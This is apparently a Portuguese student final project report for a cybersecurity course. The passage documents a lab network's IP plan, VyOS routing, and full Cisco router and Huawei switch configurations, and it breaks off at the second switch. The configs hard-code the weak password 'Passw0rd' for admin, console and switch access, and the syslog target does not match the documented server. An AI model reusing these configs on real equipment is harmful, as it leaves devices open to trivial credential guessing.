**UF9197 -- Projecto Final**

**Curso:** Técnico Especialista em Cibersegurança (CET103)\
**Formador:** Fernando Ruela\
**Formandos:** António Silva, Márcia Lima e Mateus Silva\
**Data:** Março de 2026

# Índice
- Capítulo 1

- 1.1 Introdução

- 1.2 Diagrama de rede

- 1.3 Tabela Completa de Endereços IP --- Grupo AMM

- 1.4 Ambiente de Pré-Produção --- Simulação com VyOS

-  Edição Vyos

- Capítulo 2

- 2.1 Configuração da Infraestrutura de Rede (AMM)

-  Implementação e Configuração do Router Cisco 4300 (Router_AMM)

-  Comutação e Segmentação de Camada 2 (Switches Huawei S5720S)

-  Configuração Técnica do Switch SW1_AMM

-  Configuração Técnica do Switch SW2_AMM

-  Gestão e Administração Remota: Resolução de Incompatibilidades SSH

- Capítulo 3

- 3.1 OPNsense -- Instalação

-  Configuração dos interfaces do OPNSense.

-  Configuração inicial através do Wizard.

-  OPT1 (em2) - Configuração

- 3.2 Criar a Autoridade de Certificação (CA) e Certificado no OPNsense

- 3.3 Configuração do Servidor OpenVPN Roadwarrior no OPNsense (MarteSuf)

- 3.4 Regras de Firewall

-  Regra na WAN (para aceitar ligações OpenVPN)

-  Regra na interface OpenVPN (para os clientes acederem à Green)

-  Regra específica --- RDP sim, PING não

-  Gerar o ficheiro .ovpn

- 3.4.2 Testar no cliente Windows 11 (winclient_red - WAN Interna)

-  Instalar o OpenVPN Connect no cliente Windows 11 da WAN Interna (VLAN 10 RED):

- Login através da OpnVpn efetuado com sucesso

-  Conectar via RDP ao Windows Server

- 3.4.3 NAT para internet funcionar através da VPN no MarteSuf

- 3.5 Configurar o Suricata no OPNsense (MarteSuf)

-  Criação de regra User defined

- 3.6 VPN IPSec entre MarteSuf (OPNsense) e VenusSuf (PFsense)

- 3.6.1 MarteSuf (OPNsense)

-  Pre-Shared Key

-  Autenticação

-  Child SAs (Phase 2)

-  Regras de Firewall

-  Configurar o Interface IPSec para gerir o tráfego que circula dentro
do túnel

-  Validação da conexão IPsec

- 3.7 Configurar o OPNsense (MarteSuf) para enviar logs para o syslog-ng

-  Configurar o destino remoto no OPNsense

-  Regra de Firewall para Envio de Logs (Syslog)

-  Definir gateway para a interface LAN.

- 3.8 Configuração de Rota para IPSec --- OPNsense MarteSuf

-  Criar o Gateway

-  Adicionar a rota permanente

- Capítulo 4

- 4.1 Linux Mint -- Wazuh Server (alínea 6.2.3.)

- 4.1.1 Instalação do Linux Mint

- 4.2 Instalação do Wazuh-Manager

- 4.3 Implementação e Configuração de Agentes Wazuh

-  Instalação do Wazuh-Agent no Windows Server

-  Instalação do Wazuh-Agent no Windows Cliente (winclient -- green
zone)

-  Instalação do Wazuh-Agent no Windows 10 (Venus)

-  Instalação do Wazuh-Agent no Ubuntu Syslog (Venus)

-  Instalação do Wazuh-Agent no Ubuntu Nessus (Venus)

-  Instalação do Wazuh-Agent no Win Core (Orange)

-  Instalação do Wazuh-Agent no Debian-WAF

- 4.4 Integração Suricata no Wazuh

-  Configuração do Wazuh Manager para Receção de Syslog

-  Configurar o OPNsense para enviar logs do Suricata para o Wazuh

-  Implementação do Descodificador (Suricata Decoder)

-  Implementação de Regras de Alerta (Suricata Rules)

-  Simulação de Ataque DoS (Kali Linux) e Deteção em Tempo Real.

- 4.5 Encaminhamento de Alertas para Servidor Externo (Syslog-ng)

-  Edição do Ficheiro de Configuração ossec.conf

-  Implementação do Bloco de Configuração de Saída (Syslog Output)

-  Finalização e Reinício do Serviço Wazuh Manager

- 4.6 Threat Hunting e Deteção de Incidentes

-  Ataque DoS: Kali Linux (Zona Red) via hping3

-  Análise de Movimento Lateral e Escalamento de Privilégios: Do Kali ao
Windows Server

-  Deteção e Mitigação de Ameaça Externa Real (Caso de Estudo)

- 4.6.2 Conclusão: Eficácia da Monitorização e Resposta a Incidentes

- Capítulo 5

- 5.1 Configuração do Controlador de Domínio: Microsoft Windows Server

- 5.1.1 Introdução

- 5.1.2 Instalação e Configuração de Funções

- 5.1.3 Promoção do Servidor: Implementação do Active Directory Domain
Services (AD DS) Introdução

- 5.1.4 Configuração do Active Directory Domain Services (AD DS)

- 5.1.5 Configuração e Gestão do Serviço DNS

- 5.1.6 Configuração do Serviço DHCP

- 5.1.7 Active Directory -- Estrutura Lógica (Ous, Grupos e Utilizadores)

-  Estruturação Hierárquica de Unidades Organizativas (OUs)

-  Implementação de Grupos de Segurança Globais

-  Configuração de Subunidades Organizativas (Sub-OUs)

-  Provisionamento e Alocação de Utilizadores

-  Associação de Utilizadores aos Grupos de Segurança

- 5.1.8 Administração e Gestão de Políticas de Grupo (GPO)

-  Configuração de Políticas de Segurança de Conta ao Nível de Domínio

- 5.1.9 Configuração de Diretivas de Firewall do Windows (Zona Green)

-  Replicação da Política de Firewall para as Restantes Localizações

-  Implementação de Diretivas de Restrição de Início de Sessão (Logon)

-  Propagação e Validação das Políticas de Grupo (GPO)

- 5.2 Implementação de NPS/RADIUS para Autenticação OpenVPN (Exclusiva
IT)

-  Configuração no Windows Server 2022:

-  Autorização do NPS no Domínio

-  Configuração do RADIUS Client (OPNsense)

-  Criação de Diretivas de Rede (Network Policies)

- Identificação da Diretiva de Rede

-  Integração e Validação do Servidor RADIUS na OPNsense

-  Configuração do Método de Autenticação Global

- 5.3 Configuração de Recursos Partilhados no Windows Server

-  Configuração de Partilha Avançada e Permissões de Rede

-  Configuração de Permissões de Segurança (NTFS)

-  Atribuição de Privilégios NTFS ao Utilizador de Serviço

-  Ajuste de Diretivas de Firewall (Tráfego SMB)

- 5.4 Ativação do Protocolo de Ambiente de Trabalho Remoto (RDP)

-  Configuração de Direitos de Acesso RDP via Group Policy

- 5.5 Conclusão da Configuração do Windows Server (DC)

- Capítulo 6

- 6.1 Implementação do Cliente Windows 11 (Zona Green)

-  Integração da Estação de Trabalho no Domínio (Domain Join)

-  Gestão de Objetos de Computador no Active Directory

- 6.2 Conclusão da Configuração do Windows 11 (Zona Green)

- Capítulo 7

- 7.1 Implementação do Agente NXLog no Windows Server Core

- Capítulo 8

- 8.1 Configuração do Serviço Rsyslog no WAF (Debian)

- Glossário

- Glossário de Comandos Úteis

- Webgrafia

#  

# 

## Introdução

O presente trabalho foi desenvolvido no âmbito do curso CET103 ---
Técnico Especialista em CiberSegurança, e tem como objetivo a conceção,
implementação e documentação de uma infraestrutura de segurança de redes
completa, simulando um ambiente empresarial real em contexto
virtualizado.

A infraestrutura desenvolvida pelo Grupo AMM assenta numa rede física
constituída por um router Cisco 4300 e dois switches Huawei S5720S,
sobre a qual foram implementadas múltiplas zonas de segurança
segmentadas através de VLANs. A partir desta base, foram construídas
duas firewalls distintas --- VenusSuf, baseada em pfSense, e MarteSuf,
baseada em OPNsense --- cada uma com as suas zonas DMZ (Orange) e rede
interna (Green), replicando a arquitetura típica de uma organização com
necessidades reais de segurança perimetral.

O projeto abrange um conjunto alargado de tecnologias e competências da
área da cibersegurança. Ao nível da rede física, foram configurados
routing inter-VLAN, NAT/PAT, DHCP, ACLs e acesso SSH restrito à VLAN de
gestão. Ao nível dos firewalls, foram implementadas regras de filtragem
baseadas no princípio de negação por defeito, zonas DMZ com servidores
web e WAF, e sistemas de deteção de intrusão com Snort e Suricata. Para
centralização e análise de eventos de segurança, foi implementado um
SIEM com Wazuh, integrado com os IDS de ambas as firewalls e capaz de
executar respostas ativas automáticas. O logging centralizado foi
assegurado através de uma stack syslog-ng, Loki, Promtail e Grafana. A
análise de vulnerabilidades foi realizada com o Nessus sobre todas as
máquinas virtuais do projeto. Foram ainda implementadas três VPNs ---
Wireguard roadwarrior, OpenVPN roadwarrior com autenticação RADIUS via
Active Directory, e IPSec site-to-site entre as duas firewalls --- e um
Active Directory com utilizadores, grupos e OUs organizadas por
departamento e localização geográfica.

A componente ofensiva do projeto, desenvolvida a partir da zona Red (WAN
Interna), incluiu ataques controlados de port scan e DOS para validação
dos sistemas de deteção, análise dos sites web vulneráveis do servidor
CentOS, e uma tarefa de red team que envolveu a criação de uma reverse
shell sobre um sistema Windows atualizado e a subsequente escalada de
acesso através da VPN OpenVPN até à rede interna da MarteSuf.

A arquitetura global do projeto foi desenhada segundo os princípios de
defense in depth, menor privilégio e segmentação de rede, garantindo que
o comprometimento de qualquer componente individual não implique o
acesso imediato às zonas mais sensíveis da infraestrutura. O resultado é
uma solução coesa que integra prevenção, deteção, resposta e auditoria
numa única infraestrutura de laboratório, alinhada com as práticas
utilizadas em ambientes de produção profissionais.

## Diagrama de rede

O presente diagrama ilustra a **arquitetura de rede lógica** de um
ambiente de laboratório focado em cibersegurança. A infraestrutura
baseia-se numa estratégia de **segmentação rigorosa**, utilizando
firewalls (PFSense e OpnSense) para isolar zonas distintas --- desde a
rede de gestão e DMZs até às áreas de monitorização e ataque (Kali
Linux). Esta estrutura foi desenhada para simular um ambiente de
produção real, integrando tecnologias de VPN (WireGuard, OpenVPN, IPsec)
e ferramentas de auditoria como o Nessus e o Wazuh.

![](./images/media/image2.png)

*Figura 1 - Topologia lógica da arquitetura de rede do laboratório,
evidenciando a segmentação por VLANs, zonas DMZ (Venus e Marte) e a
integração de mecanismos de segurança (PFSense, OpnSense e túneis VPN).*

## Tabela Completa de Endereços IP --- Grupo AMM

A tabela seguinte apresenta a totalidade dos endereços IP atribuídos à
infraestrutura do Grupo AMM, organizados por zona e segmento de rede.
Para cada entrada estão identificados o dispositivo ou serviço
correspondente e a respetiva máscara de sub-rede, permitindo uma leitura
rápida e inequívoca do esquema de endereçamento adotado.

O endereçamento foi estruturado de forma a refletir a segmentação lógica
da rede: a VLAN 103 reservada à gestão dos equipamentos físicos, as
VLANs 10, 20 e 30 correspondentes às zonas Red, VenusSuf e MarteSuf
respetivamente, e as redes internas Orange e Green de cada firewall com
blocos de endereços distintos e não sobreponíveis. As redes VPN
completam o mapa de endereçamento, cobrindo os túneis Wireguard, OpenVPN
e IPSec implementados no projeto

  -----------------------------------------------------------------------
  **ZONA / SEGMENTO**  **DISPOSITIVO / SERVIÇO**     **ENDEREÇO IP /
                                                     MÁSCARA**
  -------------------- ----------------------------- --------------------
  **WAN EXTERNA &                                    
  INFRAESTRUTURA**                                   

  WAN Externa          Router Cisco (NAT Outside)    10.2.235.2/16

  Infraestrutura       Gateway Routing (Rede Centro) 10.2.255.254/16

  **VLAN 103 ---                                     
  GESTÃO DE                                          
  EQUIPAMENTOS**                                     

  **VLAN 103**         Router Cisco (Gateway Gestão) 10.103.50.1/24

  **VLAN 103**         Switch SW1_AMM                10.103.50.2/24

  **VLAN 103**         Switch SW2_AMM                10.103.50.3/24

  **VLAN 10 --- RED                                  
  --- WAN INTERNA**                                  

  **VLAN 10**          Rede WAN Interna (gama)       10.10.50.64/29

  **VLAN 10**          Gateway (Router Cisco)        10.10.50.65/29

  **VLAN 10**          Windows 11                    10.10.50.67/29

  **VLAN 10**          Kali Linux                    10.10.50.69/29

  **VLAN 20 ---                                      
  VENUSSUF ---                                       
  PFSENSE**                                          

  **VLAN 20 WAN**      pfSense Interface WAN         10.20.50.98/29

  **VLAN 20 WAN**      Gateway (Router Cisco)        10.20.50.97/29

  Orange VenusSuf      pfSense Interface Orange      192.168.50.249/29

  Orange VenusSuf      CentOS 7 (Apache / Nginx)     192.168.50.250/29

  Green VenusSuf       Rede Interna Venus (gama)     172.20.50.192/28

  Green VenusSuf       pfSense Interface Green (GW)  172.20.50.193/28

  Green VenusSuf       Syslog Server (Debian)        172.20.50.194/28

  Green VenusSuf       Nessus / OpenVAS (Fedora)     172.20.50.195/28

  Green VenusSuf       Windows 10                    172.20.50.196/28

  **VLAN 30 ---                                      
  MARTESUF ---                                       
  OPNSENSE**                                         

  **VLAN 30 WAN**      OPNsense Interface WAN        10.30.50.130/29

  **VLAN 30 WAN**      Gateway (Router Cisco)        10.30.50.129/29

  Orange MarteSuf      OPNsense Interface Orange     192.168.150.241/29

  Orange MarteSuf      WAF (Linux / ModSecurity)     192.168.150.242/29

  Orange MarteSuf      Windows Core 2022 (IIS)       192.168.150.243/29

  Green MarteSuf       Rede Interna Marte (gama)     172.30.50.96/28

  Green MarteSuf       OPNsense Interface Green (GW) 172.30.50.97/28

  Green MarteSuf       Windows Server 2022 (ADDC)    172.30.50.98/28

  Green MarteSuf       Windows 11 (domínio)          172.30.50.99/28

  Green MarteSuf       Wazuh SIEM (Linux)            172.30.50.100/28

  **VPNs**                                           

  VPN                  Wireguard Roadwarrior         10.50.10.2/24
                       (cliente Win11)               

  VPN                  OpenVPN Roadwarrior (servidor 10.200.50.1/24
                       MarteSuf)                     

  VPN                  IPSec Site-to-Site (VenusSuf  Tunnel entre WANs
                       ↔ MarteSuf)                   
  -----------------------------------------------------------------------

*Figura 2 - Endereços IP atribuídos à infraestrutura do Grupo AMM*

## Ambiente de Pré-Produção --- Simulação com VyOS

Dado que o projeto foi desenvolvido em equipa por três elementos, e que
o acesso ao hardware físico --- Router Cisco 4300 e Switches Huawei
S5720S --- estava limitado ao ambiente de sala, foi necessário encontrar
uma solução que permitisse adiantar e validar o trabalho de forma
independente. Para esse efeito, recorreu-se ao VyOS, um router virtual
de código aberto, como ambiente de pré-produção doméstico.

O VyOS permitiu simular o comportamento do router Cisco antes da
implementação final, nomeadamente a lógica de segmentação por VLANs, o
modelo Router-on-a-Stick, o encaminhamento estático para as redes
internas dos firewalls e o isolamento da rede de gestão. Desta forma,
foi possível validar e refinar o plano de endereçamento IP do Grupo AMM
em casa, minimizando o risco de erros durante a apresentação. A
configuração foi posteriormente adaptada e transposta para o Router
Cisco 4300, aquando da implementação final em sala.

##### Edição Vyos 

O VyOS é uma ferramenta poderosa porque, ao contrário de roteadores
domésticos, ele te obriga a entender a hierarquia das interfaces e do
roteamento, o que é música para os ouvidos de qualquer administrador de
sistemas.

Como o VyOS será o seu \"Cisco dublê\", ele atuará como o nó central que
conhece todas essas rotas. Para que tudo funcione conforme a tabela do
António, vamos configurar as Interfaces, os IPs e as Descrições.

Utilizaszamos o VyOS como ambiente de pré-produção para validar o
**Diagrama de Endereçamento IP** antes da implementação final no
hardware Cisco.

**1. Implementação do Roteamento e Segmentação (Router-on-a-Stick)**

Para a infraestrutura central da rede, foi utilizado o **VyOS** como
router virtual de pré-produção, permitindo validar toda a lógica de
endereçamento IP do grupo **AMM** antes da transição para o hardware
físico **Cisco RFO**.

A configuração seguiu o modelo **Router-on-a-Stick**, onde uma única
interface física (eth1) atua como um *Trunk* para transportar múltiplas
redes lógicas através de sub-interfaces (VLANs). Foram configuradas as
seguintes zonas:

-   **VLAN 10 (Red) 10.10.50.65/29:** Rede de auditoria e pentesting
    (Kali/Parrot).

-   **VLAN 20 (VenusSuf) 10.20.50.97/29:** Rede de trânsito para a
    Firewall pfSense.

-   **VLAN 30 (MarteSuf)** **10.30.50.129/29:** Rede de trânsito para a
    Firewall OPNsense.

-   **VLAN 103 (Gestão)** **10.103.50.1/24:** Rede isolada para
    administração segura via SSH.

![](./images/media/image3.png)

*Figura 3 -- Vyos Configurado*

**Configuração das Rotas (O \"Cérebro\" do Roteamento)**

Executa estes comandos no VyOS para que ele saiba o caminho para as
redes internas:

Para que o Kali (VLAN 10) consiga chegar aos servidores nas zonas
**Orange** e **Green**, é necessário dizer ao VyOS quem são os
\"porteiros\" (gateways) dessas redes:

1.  **Entra no modo de configuração:** configure

2.  **Adiciona as rotas para o pfSense (Venus):**

    -   **Rede Orange (DMZ):** set protocols static route
        192.168.50.248/29 next-hop 10.20.50.98

    -   **Rede Green (Logs/Grafana):** set protocols static route
        172.20.50.192/28 next-hop 10.20.50.98

3.  **Adiciona as rotas para o OPNsense (Marte):**

    -   **Rede Orange (Web/DB):** set protocols static route
        192.168.150.240/29 next-hop 10.30.50.130

    -   **Rede Green (ADDC/Windows):** set protocols static route
        172.30.50.96/28 next-hop 10.30.50.130

4.  **Grava as alterações:** commit e save

**Verificação Final da Tabela de Rotas**

  ------------------------------------------------------------------------------
  **IRede de Destino**           **Gateway          **Interface**   **Estado**
                                 (Nest-hop)**                       
  ------------------------------ ------------------ --------------- ------------
  **172.20.50.192/28** (Green    10.20.50.98        eth1.20         **OK**
  Venus)                                                            

  **192.168.50.248/29** (Orange  10.20.50.98        eth1.20         **OK**
  Venus)                                                            

  **172.30.50.96/28** (Green     10.30.50.130       eth1.30         **OK**
  Marte)                                                            

  **192.168.150.240/29** (Orange 10.30.50.130       eth1.30         **OK**
  Marte)                                                            
  ------------------------------------------------------------------------------

**2. Estratégia de Encaminhamento Estático**

Para garantir a comunicação com as sub-redes internas (**Green** e
**Orange**) localizadas atrás das firewalls periféricas, foram
implementadas rotas estáticas no nó central. Esta configuração é vital
para que o tráfego de monitorização (Grafana/Loki) e de serviços
(Apache/Active Directory) flua corretamente entre as diferentes zonas de
segurança:

-   **Destino VenusSuf (172.20.50.192/28 e 192.168.50.248/29):**
    Encaminhado via Gateway 10.20.50.98.

-   **Destino MarteSuf (172.30.50.96/28 e 192.168.150.240/29):**
    Encaminhado via Gateway 10.30.50.130.

![](./images/media/image4.png)

*Figura 4 -- Vyos Encaminhamento Estático*

**3. Isolamento da Rede de Gestão (VLAN 103)**

Seguindo as boas práticas de **Cibersegurança** e o princípio do **Menor
Privilégio**, foi implementada uma política de firewall rigorosa para a
**VLAN 103**. O isolamento desta rede é crítico por vários motivos:

-   **Prevenção de Movimentação Lateral:** Impede que um atacante que
    comprometa uma máquina na VLAN 10 (Red) consiga aceder diretamente
    às interfaces de gestão dos routers e switches.

-   **Redução da Superfície de Ataque:** Apenas dispositivos na rede de
    gestão podem iniciar sessões administrativas.

-   **Conformidade com o Projeto:** Garante que o tráfego de controlo
    está segregado do tráfego de dados e de ataques simulados.

**4. Resumo de Configuração (VyOS)**

Configuração de isolamento no VyOS

**Comandos:** set firewall name PROTEGE_GESTAO default-action drop

set firewall name PROTEGE_GESTAO rule 10 action accept

set firewall name PROTEGE_GESTAO rule 10 state established enable

set firewall name PROTEGE_GESTAO rule 10 state related enable

set interfaces ethernet eth1 vif 103 firewall in name PROTEGE_GESTAO

![](./images/media/image5.png)

*Figura 5 -- Vyos Isolamento de Rede*

**5. Plano de Transição para Cisco RFO (Implementação em Sala)**

Dada a compatibilidade lógica, a transição para o ambiente físico do
Cinel será realizada através da tradução dos comandos de sub-interfaces
e rotas para a sintaxe **Cisco IOS**, mantendo a integridade do plano de
endereçamento IP validado em casa.

# 

## Configuração da Infraestrutura de Rede (AMM)

##### Implementação e Configuração do Router Cisco 4300 (Router_AMM)

Nesta etapa fundamental, o Router Cisco 4300, designado como Router_AMM,
foi configurado para atuar como o Default Gateway e o nó de segurança
central de toda a infraestrutura. A filosofia de configuração seguiu
rigorosamente a lógica de Privilégio Mínimo, garantindo que apenas o
tráfego estritamente necessário flua entre as diversas zonas de
segurança (Red, Venus, Marte e Gestão) e a rede externa. Esta abordagem
minimiza a superfície de ataque e assegura que a comunicação inter-VLAN
seja devidamente controlada e auditada desde o ponto central da rede.

**Segurança, Proteção de Acesso e Administração**\
A segurança do próprio equipamento de rede constitui a primeira linha de
defesa da infraestrutura. Para mitigar riscos de acesso não autorizado e
ataques de força bruta, implementou-se o comando de encriptação de
passwords para evitar a exposição de credenciais em texto claro no
ficheiro de configuração, reforçado pelo uso de algoritmos de hashing
forte no acesso ao modo privilegiado. No que respeita à administração
remota, desativou-se o protocolo Telnet, por ser inerentemente inseguro,
em favor do protocolo SSH v2 com chaves RSA de 2048 bits. O acesso
administrativo foi ainda restringido através de Listas de Controlo de
Acesso (ACLs) aplicadas às linhas de terminal virtual (VTY), permitindo
ligações exclusivamente a partir da VLAN de Gestão e bloqueando qualquer
tentativa de acesso vinda de outras zonas ou da rede externa.

**Conectividade WAN e Saída para a Internet**\
Para assegurar que a infraestrutura interna comunica com o exterior,
estabeleceu-se a ligação ao Router do Centro de Formação (CINEL) através
de uma Rota Estática Padrão (Default Route) apontando para o endereço IP
10.2.255.254. Este endereço representa o salto seguinte (next-hop) na
WAN externa, permitindo o encaminhamento correto de todo o tráfego não
destinado às redes locais. Complementarmente, implementou-se a técnica
de NAT Overload (PAT), que é vital para a segurança da rede interna, uma
vez que oculta o endereçamento privado (RFC 1918) atrás de um único
endereço público, dificultando o varrimento direto de hosts internos a
partir da WAN.

**Segmentação de Camada 2: VLANs e Trunking**\
A separação lógica da rede foi conseguida através da implementação de
VLANs, utilizando o protocolo de tagging 802.1Q em modo Trunk na ligação
entre o router e os switches. Esta configuração permite que uma única
interface física transporte tráfego de múltiplas redes de forma isolada
e segura. Nos portos dos switches onde se ligam os hosts finais,
utilizou-se o modo de acesso (Access Mode), garantindo que cada
dispositivo pertence estritamente ao seu domínio de difusão. A técnica
de Router-on-a-Stick no Router_AMM possibilitou a criação de
sub-interfaces lógicas, permitindo um encaminhamento inter-VLAN granular
e seguro.

**Controlo de Acesso e Justificação Técnica de ACLs**\
No âmbito do controlo de tráfego, a infraestrutura baseou-se na
implementação de ACLs Standard (Listas de Controlo de Acesso Normais).
Estas listas filtram o tráfego exclusivamente com base no endereço IP de
origem e foram aplicadas para definir as sub-redes autorizadas a
realizar NAT, bem como para restringir o acesso às linhas de gestão. É
importante salientar a distinção teórica entre estas e as ACLs Extended
(Estendidas), que permitem um controlo muito mais minucioso ao filtrar
por IP de destino, protocolo e porto. Embora neste cenário de projeto se
tenham utilizado ACLs Standard por serem adequadas às necessidades de
conectividade do laboratório, reconhece-se que num ambiente de produção
de alta criticidade a norma seria a utilização de ACLs Extended ou de
uma Firewall dedicada. Em produção, o controlo deve seguir um modelo de
Zero Trust, garantindo que o tráfego é filtrado ao nível da aplicação e
do porto específico, em vez de permitir o tráfego de sub-redes
completas.

**Gestão de Endereçamento e Auditoria de Sistema**\
A gestão de endereçamento foi otimizada com a configuração de um pool
DHCP dedicado à Zona RED, incluindo a exclusão de IPs estáticos para
prevenir conflitos e ataques de IP Spoofing. No âmbito da monitorização,
ativou-se o registo de logs de sistema e de todas as traduções de rede
(NAT). Esta configuração é essencial para a rastreabilidade e auditoria,
pois permite que o administrador correlacione fluxos de tráfego externos
com os endereços privados reais das máquinas internas em caso de
incidente de segurança.

! ========================================================

! **CONFIGURAÇÃO COMPLETA DO ROUTER CISCO 4300 - GRUPO AMM**

!

! ========================================================

**! Ativar timestamps nos logs e debug para facilitar troubleshooting**

service timestamps debug datetime msec

service timestamps log datetime msec

**! Encriptar todas as passwords no running-config (segurança básica)**

service password-encryption

**! Definir hostname (identifica o grupo)**

hostname Router_AMM

**! Desativar o novo modelo AAA (usamos autenticação local simples - não
precisamos de RADIUS)**

no aaa new-model

**! Definir domain name (necessário para SSH e para o domínio Windows
AntMarMat.win)**

ip domain name AntMarMat.win

**! Criar utilizador de gestão com privilégio máximo (15 = full
access)**

username admin privilege 15 secret Passw0rd

! ==================== CONFIGURAÇÃO SSH (ponto 1.4) ====================

**! Gerar chaves RSA de 2048 bits (obrigatório para SSH funcionar)**

crypto key generate rsa general-keys modulus 2048

**! Forçar apenas SSH versão 2 (mais segura que SSHv1)**

ip ssh version 2

**! Definir timeout e número máximo de tentativas de login**

ip ssh time-out 60

ip ssh authentication-retries 3

! ==================== DHCP PARA ZONA RED (Wan Interna)
====================

**! Excluir o IP do próprio router do pool DHCP**

ip dhcp excluded-address 10.10.50.65

**! Criar pool DHCP para a VLAN 10 (Red)**

ip dhcp pool POOL_RED

network 10.10.50.64 255.255.255.248

default-router 10.10.50.65

dns-server 8.8.8.8

! ==================== INTERFACES FÍSICAS E SUB-INTERFACES
====================

**! Interface física principal (sem IP - apenas base para
sub-interfaces)**

interface GigabitEthernet0/0/0

no ip address

no shutdown

**! Sub-interface VLAN 10 - Red (Wan Interna + Kali/Parrot/Windows)**

interface GigabitEthernet0/0/0.10

description VLAN_RED

encapsulation dot1Q 10

ip address 10.10.50.65 255.255.255.248

ip nat inside

**! Sub-interface VLAN 20 - Venus WAN (ligação à firewall VenusSuf)**

interface GigabitEthernet0/0/0.20

description VLAN_VENUS_WAN

encapsulation dot1Q 20

ip address 10.20.50.97 255.255.255.248

ip nat inside

**! Sub-interface VLAN 30 - Marte WAN (ligação à firewall MarteSuf)**

interface GigabitEthernet0/0/0.30

description VLAN_MARTE_WAN

encapsulation dot1Q 30

ip address 10.30.50.129 255.255.255.248

ip nat inside

**! Sub-interface VLAN 103 - Gestão (acesso SSH exclusivo aos
equipamentos)**

interface GigabitEthernet0/0/0.103

description VLAN_GESTAO

encapsulation dot1Q 103

ip address 10.103.50.1 255.255.255.0

ip nat inside

**! Interface WAN externa (ligação à Rede Centro)**

interface GigabitEthernet0/0/1

description WAN_CENTRO

ip address 10.2.235.2 255.255.0.0

ip nat outside

no shutdown

! ==================== ROUTING E NAT ====================

**! Rota default para internet (permite navegação normal)**

**! Explicação simples e clara:**

**! • 0.0.0.0 0.0.0.0 → significa "todos os endereços IP possíveis"
(qualquer destino, qualquer rede, qualquer IP do mundo)**

**! • Ou seja, quando o router recebe um pacote cujo destino não
corresponde a nenhuma rota mais específica**

**! (nem as sub-interfaces VLAN 10, 20, 30, 103, nem nenhuma outra rota
que tenhamos criado), ele usa esta rota.**

**! • O 10.2.255.254 é o next-hop (o router do Centro de Formação que
está na WAN externa).**

ip route 0.0.0.0 0.0.0.0 10.2.255.254

**! Desativar servidor HTTP (segurança)**

no ip http server

**! Ativar logging de traduções NAT para o syslog-ng (desafio do
enunciado)**

ip nat log translations syslog

**! Regra NAT overload (PAT) - apenas redes permitidas no ACL 1**

ip nat inside source list 1 interface GigabitEthernet0/0/1 overload

**! Enviar logs para o servidor syslog-ng na Green Venus**

logging 192.168.50.248

! ==================== ACLs DE SEGURANÇA ====================

**! ACL 1 - define quais redes podem fazer NAT (exclui zonas Orange)**

access-list 1 permit 10.10.50.64 0.0.0.7

access-list 1 permit 10.20.50.96 0.0.0.7

access-list 1 permit 10.30.50.128 0.0.0.7

access-list 1 permit 172.20.50.192 0.0.0.15

access-list 1 permit 172.30.50.96 0.0.0.15

**! ACL 10 - permite acesso SSH apenas da VLAN de Gestão 103**

access-list 10 permit 10.103.50.0 0.0.0.255

! ==================== LINHAS DE ACESSO (VTY) ====================

**! Configuração das linhas VTY - acesso SSH exclusivo (ponto 1.4)**

line vty 0 4

access-class 10 in ! Só permite de VLAN 103

login local ! Usa utilizadores locais (admin)

transport input ssh ! Apenas SSH (Telnet bloqueado)

no transport input telnet ! Segurança - remove Telnet

! ==================== LINHAS CONSOLE E AUX (para laboratório)
====================

**! Configuração da consola**

line con 0

password Passw0rd

login

line aux 0

!

end

##### Comutação e Segmentação de Camada 2 (Switches Huawei S5720S)

**Implementação da Infraestrutura de Comutação**\
Após a configuração do núcleo de encaminhamento, procedeu-se à
implementação da camada de comutação (*Layer 2*) utilizando dois
equipamentos Huawei S5720S. O objetivo central desta fase foi
materializar a segmentação lógica definida pelas VLANs, garantindo que o
isolamento entre zonas (Red, Venus, Marte e Gestão) fosse mantido em
toda a infraestrutura física. Os switches foram configurados para operar
em harmonia com o Router_AMM, utilizando protocolos de *trunking* para o
transporte multi-VLAN e garantindo que cada dispositivo final fosse
atribuído ao seu domínio de difusão específico através de portos de
acesso.

**Configuração de Troncos e Gestão de Tráfego**\
A interligação entre os switches e o router central foi estabelecida
através do protocolo de encapsulamento 802.1Q (*Trunk Mode*). Esta
configuração é crítica, pois permite que um único meio físico transporte
tráfego de múltiplas redes virtuais, preservando as etiquetas (*tags*)
de identificação de cada VLAN. Para além da conectividade de dados, cada
switch recebeu uma interface virtual de gestão (Vlanif103), permitindo a
administração remota centralizada a partir da rede de gestão. A
segurança local foi reforçada com a proteção da consola através de
palavras-passe cifradas, seguindo as diretrizes de proteção de ativos da
rede.

##### Configuração Técnica do Switch SW1_AMM 

O SW1_AMM atua como o ponto de agregação principal, estabelecendo a
ligação direta ao Router Cisco e distribuindo a conectividade para as
zonas de auditoria (Red) e para as interfaces externas das firewalls.

\# ========================================================

\# CONFIGURAÇÃO COMPLETA DO SWITCH HUAWEI S5720S SW1_AMM

\#

\# ========================================================

**\# Definir nome do switch (identifica o grupo AMM)**

sysname SW1_AMM

**\# Criar as 4 VLANs exigidas pelo enunciado (10-Red, 20-Venus,
30-Marte, 103-Gestão)**

vlan batch 10 20 30 103

**\# Interface de gestão do próprio switch (IP na VLAN 103)**

interface Vlanif103

ip address 10.103.50.2 255.255.255.0

**\# Porta onde está ligado o Kali/Parrot (acesso VLAN 10 - Red)**

interface GigabitEthernet0/0/1

description Port_Kali_VLAN10

port link-type access

port default vlan 10

**\# Porta onde está ligado o pfSense VenusSuf (acesso VLAN 20)**

interface GigabitEthernet0/0/2

description Port_pfSense_VLAN20

port link-type access

port default vlan 20

**\# Porta onde está ligado o OPNsense MarteSuf (acesso VLAN 30)**

interface GigabitEthernet0/0/3

description Port_OPNsense_VLAN30

port link-type access

port default vlan 30

**\# Porta de gestão física**

interface GigabitEthernet0/0/4

description Port_Gestao_VLAN103

port link-type access

port default vlan 103

**\# Porta trunk para o Router Cisco (passa todas as 4 VLANs)**

interface GigabitEthernet0/0/23

description Trunk_to_Router

port link-type trunk

port trunk allow-pass vlan 10 20 30 103

**\# Porta trunk para o SW2 (interligação entre switches)**

interface GigabitEthernet0/0/24

description Trunk_to_SW2

port link-type trunk

port trunk allow-pass vlan 10 20 30 103

**\# Rota default para chegar ao Router (gestão e internet)**

ip route-static 0.0.0.0 0.0.0.0 10.103.50.1

**\# Configuração da consola (password cifrada para segurança)**

user-interface con 0

authentication-mode password

set authentication password cipher Passw0rd

screen-length 0

\#

return

##### Configuração Técnica do Switch SW2_AMM

O SW2_AMM complementa a infraestrutura, assegurando a expansão da rede e
a conectividade de servidores e interfaces de segurança adicionais,
mantendo a coerência do esquema de endereçamento e VLANs através da
interligação via *Trunk* ao primeiro switch.

\# ========================================================

